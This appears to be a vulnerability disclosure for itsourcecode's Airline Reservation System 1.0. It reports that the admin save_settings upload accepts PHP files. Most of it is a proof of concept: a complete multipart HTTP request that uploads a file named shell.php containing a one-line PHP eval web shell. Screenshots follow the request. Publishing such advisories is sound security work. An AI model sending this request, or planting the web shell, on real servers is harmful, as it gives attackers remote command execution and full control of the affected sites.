# Vendor

itsourcecode

# Product

Airline Reservation System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2021/03/Airline-Reservation-System-PHP-Project-Source-Code.zip

# Vulnerabilities

FileUpload

# Description

In the admin/admin_class.php page, the save_settings method can be used to upload files. However, it does not consider the file type, allowing attackers to upload PHP files through /admin/ajax.php?action=save_settings.
<img width="1465" alt="image" src="https://github.com/user-attachments/assets/d309235c-de42-4ae9-bce1-4d2d928027d6">

# Poc
```
POST /admin/ajax.php?action=save_settings HTTP/1.1
Host: 192.168.17.22
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------40529263481406965619837323063
Content-Length: 1932
Origin: http://192.168.17.22
Connection: close
Referer: http://192.168.17.22/admin/index.php?page=site_settings
Cookie: PHPSESSID=g4g7kvt5eo9hn2t1lhtcvlrclj
Priority: u=0

-----------------------------40529263481406965619837323063
Content-Disposition: form-data; name="name"

Online Flight Booking System
-----------------------------40529263481406965619837323063
Content-Disposition: form-data; name="email"

info@sample.comm
-----------------------------40529263481406965619837323063
Content-Disposition: form-data; name="contact"

+6948 8542 623
-----------------------------40529263481406965619837323063
Content-Disposition: form-data; name="about"

<p style="text-align: center; background: transparent; position: relative;"><span style="background: transparent; position: relative; font-size: 14px;"><span style="font-size:28px;background: transparent; position: relative;"><b style="margin: 0px; padding: 0px; color: rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, Arial, sans-serif; text-align: justify;">Lorem Ipsum</b><span style="color: rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-weight: 400; text-align: justify;">&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</span><br></span></p><p style="text-align: center; background: transparent; position: relative;"><br></p><p></p>
-----------------------------40529263481406965619837323063
Content-Disposition: form-data; name="img"; filename="shell.php"
Content-Type: text/php

<?php eval($_POST["cmd"]);?>

-----------------------------40529263481406965619837323063--

```
<img width="1070" alt="image" src="https://github.com/user-attachments/assets/2635eace-911a-46eb-9fa0-64e5147ff59a">
<img width="1081" alt="image" src="https://github.com/user-attachments/assets/2e369857-2342-4d32-86bb-ce773ecae9f1">

